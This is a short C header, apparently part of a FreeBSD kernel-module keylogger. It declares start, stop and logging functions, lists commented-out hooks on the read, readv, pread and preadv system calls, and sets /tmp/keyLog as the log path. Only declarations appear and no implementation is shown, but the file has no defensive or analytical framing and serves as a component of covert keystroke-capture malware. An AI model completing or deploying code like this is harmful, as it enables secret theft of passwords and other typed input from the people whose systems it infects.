#ifndef KEYLOG_H
#define KEYLOG_H

#include "config.h"
#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>

//static int readv_hook(struct thread *td, void *syscall_args);
//static int read_hook(struct thread *td, void *syscall_args);
//static int pread_hook(struct thread *td, void *syscall_args);
//static int preadv_hook(struct thread *td, void *syscall_args);
int key_log(struct thread *td, char * buf);
void start_keylog(void);
void stop_keylog(void);


#define keyLogPath "/tmp/keyLog" 

#endif /* KEYLOG_H */
